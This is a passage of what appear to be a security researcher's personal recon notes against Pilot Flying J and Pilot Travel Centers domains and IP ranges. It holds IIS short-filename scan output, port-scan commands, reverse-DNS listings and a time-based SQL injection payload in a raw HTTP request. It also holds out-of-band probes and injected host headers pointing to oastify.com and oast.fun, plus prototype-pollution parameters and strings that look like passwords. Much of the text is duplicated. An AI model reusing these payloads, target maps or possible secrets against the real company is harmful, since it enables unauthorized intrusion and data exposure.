+EXTERN~3             EXTERN?    
+EXTERN~1             EXTERN?    
+EXTERN~2             EXTERN?    
+EXTERN~4             EXTERN?    
+
+https://74.114.188.161/VENDORApplication/
+https://74.114.188.161/VENDORportal/
+
+
+
+
+
+URL: https://74.114.188.161/SURVEYexternal/
+Running: Microsoft-IIS/7.5
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+WEB~1.CON            WEB.CON?   
+ANSWER~1             ANSWER?    
+OOPS~1.ASP           OOPS.ASP?           OOPS.ASPX
+ANONYM~1.ASP         ANONYM?.ASP? 
+SURVEY~2.CSS         SURVEY?.CSS? 
+APP_OF~1.HTM         APP_OF?.HTM? 
+SURVEY~1.CSS         SURVEY?.CSS? 
+QUESTI~1.ASC         QUESTI?.ASC? 
+SURVEY~1.ASP         SURVEY?.ASP? 
+
+
+
+
+  |_ Identified directories: 1
+    |_ ANSWER~1
+  |_ Identified files: 8
+    |_ ANONYM~1.ASP
+    |_ APP_OF~1.HTM
+    |_ OOPS~1.ASP
+      |_ Actual file name = OOPS
+    |_ QUESTI~1.ASC
+    |_ SURVEY~1.ASP
+    |_ SURVEY~1.CSS
+    |_ SURVEY~2.CSS
+    |_ WEB~1.CON
+
+
+
+
+
+
+
+
+https://74.114.188.161/SURVEYexternal/OOPS.ASPX
+
+
+
+  |_ Identified directories: 29
+    |_ ASPNET~1
+    |_ BIODIE~1
+    |_ BLUEBE~1
+    |_ COMMON~1
+    |_ DFSRPR~1
+    |_ EFORMS~1
+    |_ EMPLOY~1
+    |_ EVENTR~1
+    |_ EX4213~1
+    |_ EXB78E~1
+    |_ EXE13B~1
+    |_ EXTERN~1
+    |_ EXTERN~2
+    |_ EXTERN~3
+    |_ EXTERN~4
+    |_ EXTRAN~1
+    |_ FUELPA~1
+    |_ FUELPA~2
+    |_ FUELPA~3
+    |_ FUELPA~4
+    |_ FUELPR~1
+    |_ PFJDOC~1
+    |_ PHILAN~1
+    |_ RATEPF~1
+    |_ RETAIL~1
+    |_ RETALI~1
+    |_ SURVEY~1
+    |_ VENDOR~1
+    |_ VENDOR~2
+
+https://74.114.188.161/VENDORportal/PROPERTIES/DATASOURCES/SYSTEMS.DAT
+
+
+
+GET /pfj-loyaltymkt-one9-website-e'(select*from(select(sleep(20)))a)'/ HTTP/1.1
+Host: api.cp.pilotflyingj.com
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="114", "Chromium";v="114"
+Sec-CH-UA-Platform: Windows
+Sec-CH-UA-Mobile: ?0
+
+
+
+https://fuel.pilottravelcenters.com/
+
+                            PEGASU~1.20
+                            PEGASU~1.202
+try to find this file by ffufing
+
+/Pegasus2%20Sentinel2/
+/Pegasus2
+/PEGASUS_
+/10.20.202
+
+
+ffuf with _ and .
+
+https://fuel.pilottravelcenters.com/ASPNET_CLIENT/system_web/2_0_50727/
+https://fuel.pilottravelcenters.com/ASPNET_CLIENT/system_web/4_0_30319/
+
+
+https://github.com/dwyl/english-words
+
+
+p/App_Scripts/MicrosoftAjax.js
+p/App_Scripts/wacairspaceanimationlibrary.js
+App_Scripts/MicrosoftAjax.js
+App_Scripts/wacairspaceanimationlibrary.js
+MicrosoftAjax.js
+wacairspaceanimationlibrary.js
+
+
+
+more 
+
+https://officeonline.pilottravelcenters.com/p/RESOURCES/
+
+
+google chatgpt github twiteer
+
+
+
+URL: https://officeonline.pilottravelcenters.com/p/CLIENTBIN/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+MICROS~1.XAP         MICROS?.XAP? 
+MICROS~2.XAP         MICROS?.XAP? 
+
+
+https://officeonline.pilottravelcenters.com/p/
+
+ |_ Identified directories: 8
+    |_ APP_BR~1
+    |_ APP_SC~1 app_scripts
+    |_ CLIENT~1 clientbin
+    |_ PPTRES~1 pptresources
+    |_ PPTSCR~1 pptscripts
+    |_ PPTSTA~1
+    |_ PPTTEM~1
+    |_ RESOUR~1 resources
+
+
+
+
+
+https://extranet.pilottravelcenters.com/BioDieselExternalMaintenance/backup/
+
+
+
+
+https://extranet.pilottravelcenters.com/BioDieselExternalMaintenance/
+
+https://extranet.pilottravelcenters.com/VendorPortal/WebResource.axd?d=2D8um6hCzDf4buMyKAP_QMDhhEhf_2v75GtGSg0dHLcwy55GumzsWQPvpc0WwQaFE9LmBBQaBubaMliD6IgZI6pyD63AU39wEojaauSWwxM1bt7qu'-ffuf-'j3wrr&t=637811441240000000
+
+
+
+
+
+
+
+if somebody says that something is impossible and it's not buypassible we are hackers and we always find a path to do things
+
+These blackbox regular expression testing is still not very touched I keep finding all these issues when I go to live hacking events it's it's always there
+
+If something is being validated and you can bypass it think about the impact and you'll see the big picture
+
+
+
+"X-Jenkins" "Set-Cookie: JSESSIONID" http.title:"Dashboard"
+
+
+
+
+Buypass methids
+
+
+
+https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names
+
+
+
+
+
+34 M Wordlist Subdomain Brute-Force
+Full Subdomain Enumeration
+Levels-deep Subdomain Enumeration
+
+
+Allforone
+reconftw.sh
+awscert.sh
+
+
+
+
+
+
+http://nationalpizzamonth.pilotflyingj.com/
+
+
+
+
+
+Frist Target  74.114.190.0/24  aalias 5_cidr
+
+74.114.190.25    test-okcvpn.pilotflyingj.com.
+74.114.190.214   mail12.pilottravelcenters.com.
+74.114.190.248   dns3.pilotcorp.com.
+74.114.190.249   dns4.pilotcorp.com.
+
+74.114.190.89:443  Citrix Gateway
+https://74.114.190.89/logon/LogonPoint/tmindex.html
+
+Citrix Gateway
+haw to find vershion https://github.com/fox-it/citrix-netscaler-triage
+look for do file on linkfindr on burp open all js file
+
+https://74.114.190.89/nf/auth/doNegotiate.do
+
+-------------------------------------------------------------------------------
+
+Second Target 74.114.189.0/24
+
+prips 74.114.189.0/24 |  hakrevdns
+
+74.114.189.55    as2.pilottravelcenters.com.
+74.114.189.73    mobileapps.pilotflyingj.com.
+74.114.189.73    pilot-flyingj.com.
+74.114.189.73    www.pilot-flyingj.com.
+74.114.189.73    reserve.pilotflyingj.com.
+74.114.189.73    myrewards-qa.pilotflyingj.com.
+74.114.189.73    pilottravelcenters-qa.pilotflyingj.com.
+74.114.189.73    www.pilotsurveys.com.
+74.114.189.73    pilotsurveys.com.
+74.114.189.73    www.pfjfeedback.com.
+74.114.189.73    pfjfeedback.com.
+74.114.189.73    portal-test.pilotflyingj.com.
+74.114.189.86    extranet.pilotflyingj.com.
+74.114.189.130   travelwell.pilotflyingj.com.
+74.114.189.130   rebateeducation.pilotflyingj.com.
+74.114.189.130   www.rebateeducation.pilotflyingj.com.
+74.114.189.150   connect4.pilottravelcenters.com.
+74.114.189.250   connect2.pilottravelcenters.com.
+
+
+shodan.
+
+74.114.189.73
+mobileapps.pilotflyingj.com
+www.pilotsurveys.com
+myrewards-qa.pilotflyingj.com
+pilotflyingj.com
+portal-test.pilotflyingj.com
+
+74.114.189.130
+travelwell.pilotflyingj.com
+rebateeducation.pilotflyingj.com
+www.rebateeducation.pilotflyingj.com
+
+74.114.189.73
+mobileapps.pilotflyingj.com
+pilot-flyingj.com
+www.pilot-flyingj.com
+reserve.pilotflyingj.com
+myrewards-qa.pilotflyingj.com
+
+74.114.189.55
+as2.pilottravelcenters.com
+
+
+
+
+naabu -host 74.114.189.0/24  -top-ports 1000
+
+74.114.189.73:443
+74.114.189.55:5080
+74.114.189.130:80
+74.114.189.130:443
+74.114.189.73:80
+74.114.189.55:443
+
+masscan 74.114.189.0/24 --ports 0-65535 --rate=100000 -oX 4_cidr_massful.xml
+
+
+
+
+
+
+
+
+
+
+GET http://7ea135aefd204f3b87-ke2revwibc6msuregzkqh8b5owumib.oastify.com HTTP/1.1
+Host: loyaltyportal.pilotflyingj.com
+Accept-Encoding: gzip, deflate, br
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"
+Sec-CH-UA-Platform: Windows
+Sec-CH-UA-Mobile: ?0
+
+
+
+
+
+http://myrewards.pilotflyingj.com/?utm_source=landing%20page&utm_medium=landing%20page&utm_campaign=shower%20power
+http://nationalpizzamonth.pilotflyingj.com/?amp;utm_campaign=NTLPizza&amp;utm_medium=Social&amp;utm_term=2.6.17&amp;utm_content=ProDriverFlight1
+http://nationalpizzamonth.pilotflyingj.com/?utm_campaign=NTLPizza&utm_medium=Social&utm_term=2.6.17&utm_content=ProDriverFlight1
+http://nationalpizzamonth.pilotflyingj.com/?utm_source=Facebook&amp;utm_campaign=NTLPizza&amp;utm_medium=Social&amp;utm_term=2.6.17&amp;utm_content=ProDriverFlight1
+
+http://pilotflyingj.com/?utm_campaign=Driver View&utm_source=hs_automation&utm_medium=email&utm_content=13247573&_hsenc=p2ANqtz--8l-XJvpEhR8xwtAgfJQzbkOwVAefC9-FIi7QEqBmtkymre4MBltFdy10-IQCUJAronnCA20cjMMQ-ElOd5NWQ4oDXMA&_hsmi=13247573
+
+http://pilotflyingj.com/food?utm_campaign=Food+%26+Beverage&utm_source=hs_email&utm_medium=email&utm_content=16704398&_hsenc=p2ANqtz--HVsurUfHXFLZkUicpoqroC81_7lHywG0LEoKS5k9cSun6QUyA2cPFARdRJ5qWwuJoAAYBtgxL6W1dStMHjIdAP6Lkzg&_hsmi=16704398
+http://pilotflyingj.com/national-coffee-day?utm_campaign=Coffee&utm_content=8468452&utm_medium=social&utm_source=twitter
+http://pilotflyingj.com/national-coffee-day?utm_campaign=Coffee&utm_source=hs_email&utm_medium=email&utm_content=14289678&_hsenc=p2ANqtz--nzFH34ux9roEB3iBGKFL7YjmJVtMsST-P7IRqMh9z6LN8vPfmMGFePW0of0bZ6USstZSiJBteudMSWB7msmMeBA0wnw&_hsmi=14289678
+http://pilotflyingj.com/philmor?utm_source=redirect&utm_medium=redirect&utm_term=philmormug&utm_content=philmor&utm_campaign=myphilmordotcom/robots.txt
+http://reserve.pilotflyingj.com/Location/Details/1171?utm_source=Pilot&utm_medium=YextLocationsPages
+
+https://jobs.pilotflyingj.com/?utm_source=pilot&utm_medium=YextLocationsBlock&utm_campaign=recruitment
+
+https://locations.pilotflyingj.com/us/oh/toledo/5820-hagman-road?utm_source=Pilot&utm_medium=YextAlertBanner&utm_campaign=LaneClosures
+https://loyaltyportal.pilotflyingj.com/myrewards/confirmation?token=1V_tJgGvHMjbhDdZJZ2i0AFywOzVgo5RvJRxwNHxSnmB&_branch_match_id=1306343452090145625&utm_medium=marketing&_branch_referrer=H4sIAAAAAAAAA8soKSkottLXL8jMyS9Jy6nMzEvP0kssKNDLyczL1g8N8cs2DM8MDA61L8nPTs2zNQyLL%2FFKdy%2Fz8M1KynBJifKKMso0cHSrLPevCkvPNw0q8wqqKPfzqAjOy3UCAKppM4FbAAAA
+
+
+
+https://www.pilotflyingj.com/fleet/?gclid=CjwKCAjw27jnBRBuEiwAdjQXDKa88lGoLX9TsMN-1hFXB4HIlIdYONa_sd8uRLLXfZY3MCpW2Dns0xoCqIwQAvD_BwE
+
+
+https://videorequests.pilotflyingj.com/servlet/servlet.ImageServer?id=0153c000004TP9N&oid=00D80000000bzL1&lastMod=1602444230000
+
+https://videorequests.pilotflyingj.com/s/sfsites/l/%7B%22mode%22%3A%22PROD%22%2C%22cac%22%3A0%2C%22app%22%3A%22siteforce%3AloginApp2%22%2C%22fwuid%22%3A%22ZDROWDdLOGtXcTZqSWZiU19ZaDJFdzk4bkk0bVJhZGJCWE9mUC1IZXZRbmcyNDguMTAuNS01LjAuMTA%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AloginApp2%22%3A%22CMiYVlPW6pOgNvM9UnJGCw%22%7D%2C%22apce%22%3A1%2C%22apck%22%3A%22JHt0aW1lc3RhbXB9MDAwMDAwMDAwMDBlbl9VUw%22%2C%22mlr%22%3A1%2C%22pathPrefix%22%3A%22%22%2C%22dns%22%3A%22c%22%2C%22ls%22%3A1%2C%22lrmc%22%3A%22-386269907%22%7D/bootstrap.js?aura.attributes=%7B%22ac%22%3A%22%22%2C%22authenticated%22%3A%22false%22%2C%22brandingSetId%22%3A%2293b8bb8e-a48f-4ca0-b591-b37ee1e27633%22%2C%22formFactor%22%3A%22LARGE%22%2C%22isHybrid%22%3A%22false%22%2C%22language%22%3A%22en_US%22%2C%22pageId%22%3A%220f5f1962-5c39-4a48-b964-2edf8b3068f3%22%2C%22publishedChangelistNum%22%3A%2231%22%2C%22schema%22%3A%22Published%22%2C%22themeLayoutType%22%3A%22Login%22%2C%22uds%22%3A%22false%22%2C%22viewType%22%3A%22Published%22%7D
+
+https://videorequests.pilotflyingj.com/s/sfsites/l/%7B%22mode%22%3A%22PROD%22%2C%22cac%22%3A0%2C%22app%22%3A%22siteforce%3AloginApp2%22%2C%22fwuid%22%3A%22ZDROWDdLOGtXcTZqSWZiU19ZaDJFdzk4bkk0bVJhZGJCWE9mUC1IZXZRbmcyNDguMTAuNS01LjAuMTA%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AloginApp2%22%3A%22CMiYVlPW6pOgNvM9UnJGCw%22%7D%2C%22apce%22%3A1%2C%22apck%22%3A%22JHt0aW1lc3RhbXB9MDAwMDAwMDAwMDBlbl9VUw%22%2C%22mlr%22%3A1%2C%22pathPrefix%22%3A%22%22%2C%22dns%22%3A%22c%22%2C%22ls%22%3A1%2C%22lrmc%22%3A%22-386269907%22%7D/resources.js?pv=1716476882000107833704&rv=1716613992000
+
+https://videorequests.pilotflyingj.com/s/login?ec=302&inst=8a&startURL=%2Fcontenthub%2F
+https://recover.pilotflyingj.com/showLogin.cc?constructor%5Bprototype%5D%5Ba42e5579%5D=yf2xy3x9&constructor.prototype.b1a3fd5b=yf2xy3x9&__proto__.ccd80966=yf2xy3x9&__proto__%5Bdcb52823%5D=yf2xy3x9
+
+
+
+
+https://privacy.pilotflyingj.com/s/sfsites/aura?r=2&aura.Component.getComponent=1&ui-communities-components-aura-components-forceCommunity-navigationMenu.NavigationMenuDataProvider.getNavigationMenu=1&ui-communities-components-aura-components-forceCommunity-richText.RichText.getParsedRichTextValue=2&ui-force-components-controllers-hostConfig.HostConfig.getConfigData=1&ui-self-service-components-profileMenu.ProfileMenu.getProfileMenuResponse=1
+
+
+https://jobs.pilotflyingj.com/travel-center-jobs?custom_categories=Travel+Center+Jobs&location_city=Rawlins&location_state=Wyoming&page_number=1&page_size=50&sort_by=headline&sort_order=ASC
+http://blog.pilotflyingj.com/wp-json/swp_api/search?s=
+http://hubspot.pilotflyingj.com/travel-guide?portalId=339778&hsFormKey=12fdc54461cbe7a499d4479c41df20c3
+http://jobs.pilotflyingj.com/?debug=3e4edc5e4ade7278ed750502bde7eb65c16e037d
+http://jobs.pilotflyingj.com/ajax/click/track/insert/?FK1=5394107&EventID=9&EventData=&JobSource=
+
+
+
+
+https://loyaltyportal.pilotflyingj.com/myrewards/registration
+
+For this vulnerability, just type shodan title:"Check Point" ssl:"target"
+
+
+elati
+handru
+
+#5g/GGgd0xx
+
+samindunm
+
+
+#FU57/EVGss
+
+#FU57/EVGss
+
+
+
+TO_DO
+
+manual test main app
+
+with main app coockis try to acsees some 403 domains
+
+`
+
+https://click.newsletter.pilotflyingj.com/subscription_center.aspx?qs=9d75393b322866e96cbca414b08a5df338eb7c6b4b2089c1b7a7061cff8eb296230ab9a5c73ee57fbf9b08964019027375695b49906ce97a61f9eb21865ebdd36c2886e2e1c1f4cb
+
+`
+https://click.newsletter.pilotflyingj.com/?qs=320d4bf731b62d67eb49c76ea88060e56a2cfd6ce4c00278c28ce93e5b3f05a14db028abb5b4b147c0b1236b64feb3d94ba43669b13c6a94
+
+`
+https://click.newsletter.pilotflyingj.com/unsub_center.aspx?qs=9d75393b322866e96cbca414b08a5df338eb7c6b4b2089c1b7a7061cff8eb296230ab9a5c73ee57fbf9b08964019027375695b49906ce97a61f9eb21865ebdd36c2886e2e1c1f4cb
+
+https://click.newsletter.pilotflyingj.com/subscription_center.aspx?qs=1dc2722a7323d1d4e416926bf5937d9ca98eaa458be4ab6deb358b3cf188384095846de4f9ce728d025d72951726f5477e4c25237bab05e82d0d9c38f103cd75cf4a0bae2eecda19
+`
+https://click.newsletter.pilotflyingj.com/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx/unsub_center.aspx/Error.aspx
+
+
+https://click.newsletter.pilotflyingj.com/profile_center.aspx?qs=8e3df73589d740edde7cbdf50c81385b47136b62c928c1eebd967f13284f2c5fbb71c648452d73afd7ecf934572e0fb99603bc48f3f60a7dc95d0cf8b674fef3392ab178308c12a4
+
+
+
+
+
+
+
+http://click.newsletter.pilotflyingj.com/?qs=50ef32ecd79a805644f7feb734d1f28e464170b5e1f70fbf285650264b3b018ce1e8090fc9c8ea3a7eed468c895e84865ffd161c4cb70e8c
+
+
+
+
+
+http://click.newsletter.pilotflyingj.com/profile_center.aspx?qs=f1e6a4e46b0a9dbca914224fdb7b19ba40667d1cc939366bb2f93b963a965eaef6e80506142ec0381a9a8c03804a1f1d915914d873ab311b4341f727d3f9d13886ef400b9acd8918
+
+
+
+http://click.newsletter.pilotflyingj.com/open.aspx?d=70176&bmt=0
+
+http://click.newsletter.pilotflyingj.com/subscription_center.aspx?qs=f7715753beb0210a4811e1995f50acb935e7f8df86478b66a7149690c82621eafe6455935f0d8dd533ff90f72b45bcbfdb02788de9e80a1bdb8705580b2d42c3f5524e096585fd7f
+
+http://click.newsletter.pilotflyingj.com/unsub_center.aspx?qs=277ee25b29247cc61dc79736f775f0a3bcba4519a8afc4524f63ddbf1bd9758689731db0d5fc26228a9ef3127cb1d5b4e6adf3f5460e59cbfe42c6f554ce756283bec9178518f796
+
+http://click.newsletter.pilotflyingj.com/?qs=02e72b733a178a3ce815ef072ddaae5d05e37eb1b33aeb8108085dd28fce56280718f1e0cdb6b0a735533c3524014f9c2279e549afc76c4c
+
+
+
+
+
+
+
+
+
+http://click.newsletter.pilotflyingj.com/?qs=02e72b733a178a3ce815ef072ddaae5d05e37eb1b33aeb8108085dd28fce56280718f1e0cdb6b0a735533c3524014f9c2279e549afc76c4c
+
+
+
+
+work fine
+
+
+
+
+https://click.newsletter.pilotflyingj.com/subscription_center.aspx?qs=1dc2722a7323d1d4e416926bf5937d9ca98eaa458be4ab6deb358b3cf188384095846de4f9ce728d025d72951726f5477e4c25237bab05e82d0d9c38f103cd75cf4a0bae2eecda19
+
+https://click.newsletter.pilotflyingj.com/unsub_center.aspx?qs=9d75393b322866e96cbca414b08a5df338eb7c6b4b2089c1b7a7061cff8eb296230ab9a5c73ee57fbf9b08964019027375695b49906ce97a61f9eb21865ebdd36c2886e2e1c1f4cb
+
+
+https://click.newsletter.pilotflyingj.com/profile_center.aspx?qs=8e3df73589d740edde7cbdf50c81385b47136b62c928c1eebd967f13284f2c5fbb71c648452d73afd7ecf934572e0fb99603bc48f3f60a7dc95d0cf8b674fef3392ab178308c12a4
+
+samidu@7x:~/Desktop$ cat note.txt
+AS14556	ASN	Pilot Travel Centers, LLC
+
+
+cidrs_
+
+65.196.143.0/24
+70.159.149.0/24
+74.114.188.0/24
+74.114.189.0/24
+74.114.190.0/24
+_
+
+
+Scope:
+
+*.pilottravelcenters.com
+*.pilotflyingj.com	
+*.rvpluscard.com
+*.pilotcloud.net	
+*.greenamericabiofuels.com	
+*.pilotcompany.com	
+*.saratogarack.com	
+
+Customer Portal	
+Prime Parking
+com.pilottravelcenters.mypilot	Android.apk
+
+
+
+
+shodan_
+
+org:"Pilot Travel Centers  LLC"
+
+
+200 OK url 
+
+https://www.shodan.io/search?query=ssl.cert.subject.cn%3Apilotcloud.net+200+OK
+https://www.shodan.io/search?query=ssl.cert.subject.cn%3Apilotcloud.net+200+OK
+
+
+_
+
+
+
+
+
+
+
+root@nsr3b:~# shortscan https://ids.rsga.pilotcloud.net
+🌀 Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://ids.rsga.pilotcloud.net/
+Running: Microsoft-IIS/10.0
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+NWEBSE~1             NWEBSE?             NWEBSECCONFIG
+APP_TH~1             APP_TH?    
+WEB~1.CON            WEB.CON?   
+RESOUR~1             RESOUR?             .RESOURCES
+IDEA~1.ASP           IDEA.ASP?  
+ERROR~1.HTM          ERROR.HTM?          ERROR.HTML
+ERROR~1.ASP          ERROR.ASP? 
+IDEASU~1.ASP         IDEASU?.ASP? 
+PRECOM~1.CON         PRECOM?.CON? 
+REPORT~1.ASP         REPORT?.ASP?        REPORTVIEWERWEBFORM.ASPX
+HEALTH~1.ASP         HEALTH?.ASP?        HEALTHE-SHIELD.ASP
+REPORT~2.ASP         REPORT?.ASP?        REPORTSTATUS.ASPX
+EMPLOY~1.ASP         EMPLOY?.ASP?        EMPLOYEEMANAGEMENT.ASPX
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT_COPY%282%29.ASP
+PACKAG~1.CON         PACKAG?.CON? 
+════════════════════════════════════════════════════════════════════════════════
+
+Finished! Requests: 2052; Retries: 0; Sent 413496 bytes; Received 2800915 bytes
+
+https://ids.rsga.pilotcloud.net/EMPLOYEEMANAGEMENT.ASPX
+
+
+
+
+TO_LOOK_MORE
+
+
+https://api.cp.pilotflyingj.com/FUZZ
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/FUZZ
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/api/FUZZ
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/api/v1/FUZZ
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/api/v1/content/FUZZ
+
+
+
+https://api.cp.pilotflyingj.com/pfj-loyaltymkt-one9-website-e/api/v1/content/blog?query=&
+X-Forwarded-Host: cp1qh3vfe8pctdqeno30z8tk93hqymsbj.oast.fun
+X-Host: cp1qh3vfe8pctdqeno30z8tk93hqymsbj.oast.fun
+X-Forwarded-Server: cp1qh3vfe8pctdqeno30z8tk93hqymsbj.oast.fun
+
+
+
+* do google dork and github dork for urls
+
+
+
+
+swagger-api
+
+https://digital-qa-api.guestpreferences.pilotcloud.net/swagger/swagger-ui.js
+https://digital-dev-api.guestpreferences.pilotcloud.net/swagger/swagger-ui.js
+https://digital-api.guestpreferences.pilotcloud.net/swagger/swagger-ui.js
+
+
+
+do sub_brute
+
+
+
+*.rightangle.private.pilotcloud.net
+*.workflowengine-qa.trips.pilotcloud.net	
+
+
+
+https://74.114.188.161/ASPNET_CLIENT/system_web/2_0_50727/
+https://74.114.188.161/ASPNET_CLIENT/SYSTEM_WEB/4_0_30319/
+https://74.114.188.161/commonfiles/OFFLINeimages/APP_OFFLINE.HTM
+
+FUELPA~1             FUELPA?    
+FUELPR~1             FUELPR?    
+RATEPF~1             RATEPF?    
+WEB~1.CON            WEB.CON?   
+RETALI~1             RETALI?    
+EFORMS~1             EFORMS?    
+EVENTR~1             EVENTR?    
+RETAIL~1             RETAIL?    
+EXE13B~1             EXE13B?    
+EXB78E~1             EXB78E?    
+EXTRAN~1             EXTRAN?    
+EX4213~1             EX4213?    
+PFJDOC~1             PFJDOC?    
+PHILAN~1             PHILAN?    
+VENDOR~2             VENDOR?    
+BIODIE~1             BIODIE?    
+BLUEBE~1             BLUEBE?    
+FUELPA~4             FUELPA?    
+FUELPA~3             FUELPA?    
+FUELPA~2             FUELPA?    
+DFSRPR~1             DFSRPR?    
+VENDOR~1             VENDOR?    
+
+DOWN_F~1.JPG         DOWN_F?.JPG? 
+EMPLOY~1             EMPLOY?    
+SURVEY~1             SURVEY?    
+ASPNET~1             ASPNET?             https://74.114.188.161/aspnet_client
+COMMON~1             COMMON?             https://74.114.188.161/commonfiles
+EXTERN~3             EXTERN?    
+EXTERN~1             EXTERN?    
+EXTERN~2             EXTERN?    
+EXTERN~4             EXTERN?    
+
+https://74.114.188.161/VENDORApplication/
+https://74.114.188.161/VENDORportal/
+
+
+
+
+
+URL: https://74.114.188.161/SURVEYexternal/
+Running: Microsoft-IIS/7.5
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+WEB~1.CON            WEB.CON?   
+ANSWER~1             ANSWER?    
+OOPS~1.ASP           OOPS.ASP?           OOPS.ASPX
+ANONYM~1.ASP         ANONYM?.ASP? 
+SURVEY~2.CSS         SURVEY?.CSS? 
+APP_OF~1.HTM         APP_OF?.HTM? 
+SURVEY~1.CSS         SURVEY?.CSS? 
+QUESTI~1.ASC         QUESTI?.ASC? 
+SURVEY~1.ASP         SURVEY?.ASP? 
+
+
+
+
+  |_ Identified directories: 1
+    |_ ANSWER~1
+  |_ Identified files: 8
+    |_ ANONYM~1.ASP
+    |_ APP_OF~1.HTM
+    |_ OOPS~1.ASP
+      |_ Actual file name = OOPS
+    |_ QUESTI~1.ASC
+    |_ SURVEY~1.ASP
+    |_ SURVEY~1.CSS
+    |_ SURVEY~2.CSS
+    |_ WEB~1.CON
+
+
+
+
+
+
+
+
+https://74.114.188.161/SURVEYexternal/OOPS.ASPX
+
+
+
+  |_ Identified directories: 29
+    |_ ASPNET~1
+    |_ BIODIE~1
+    |_ BLUEBE~1
+    |_ COMMON~1
+    |_ DFSRPR~1
+    |_ EFORMS~1
+    |_ EMPLOY~1
+    |_ EVENTR~1
+    |_ EX4213~1
+    |_ EXB78E~1
+    |_ EXE13B~1
+    |_ EXTERN~1
+    |_ EXTERN~2
+    |_ EXTERN~3
+    |_ EXTERN~4
+    |_ EXTRAN~1
+    |_ FUELPA~1
+    |_ FUELPA~2
+    |_ FUELPA~3
+    |_ FUELPA~4
+    |_ FUELPR~1
+    |_ PFJDOC~1
+    |_ PHILAN~1
+    |_ RATEPF~1
+    |_ RETAIL~1
+    |_ RETALI~1
+    |_ SURVEY~1
+    |_ VENDOR~1
+    |_ VENDOR~2
+
+https://74.114.188.161/VENDORportal/PROPERTIES/DATASOURCES/SYSTEMS.DAT
+
+
+
+GET /pfj-loyaltymkt-one9-website-e'(select*from(select(sleep(20)))a)'/ HTTP/1.1
+Host: api.cp.pilotflyingj.com
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="114", "Chromium";v="114"
+Sec-CH-UA-Platform: Windows
+Sec-CH-UA-Mobile: ?0
+
+
+
+https://fuel.pilottravelcenters.com/
+
+                            PEGASU~1.20
+                            PEGASU~1.202
+try to find this file by ffufing
+
+/Pegasus2%20Sentinel2/
+/Pegasus2
+/PEGASUS_
+/10.20.202
+
+
+ffuf with _ and .
+
+https://fuel.pilottravelcenters.com/ASPNET_CLIENT/system_web/2_0_50727/
+https://fuel.pilottravelcenters.com/ASPNET_CLIENT/system_web/4_0_30319/
+
+
+https://github.com/dwyl/english-words
+
+
+p/App_Scripts/MicrosoftAjax.js
+p/App_Scripts/wacairspaceanimationlibrary.js
+App_Scripts/MicrosoftAjax.js
+App_Scripts/wacairspaceanimationlibrary.js
+MicrosoftAjax.js
+wacairspaceanimationlibrary.js
+
+
+
+more 
+
+https://officeonline.pilottravelcenters.com/p/RESOURCES/
+
+
+google chatgpt github twiteer
+
+
+
+URL: https://officeonline.pilottravelcenters.com/p/CLIENTBIN/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+MICROS~1.XAP         MICROS?.XAP? 
+MICROS~2.XAP         MICROS?.XAP? 
+
+
+https://officeonline.pilottravelcenters.com/p/
+
+ |_ Identified directories: 8
+    |_ APP_BR~1
+    |_ APP_SC~1 app_scripts
+    |_ CLIENT~1 clientbin
+    |_ PPTRES~1 pptresources
+    |_ PPTSCR~1 pptscripts
+    |_ PPTSTA~1
+    |_ PPTTEM~1
+    |_ RESOUR~1 resources
+
+
+
+
+
+https://extranet.pilottravelcenters.com/BioDieselExternalMaintenance/backup/
+
+
+
+
+https://extranet.pilottravelcenters.com/BioDieselExternalMaintenance/
+
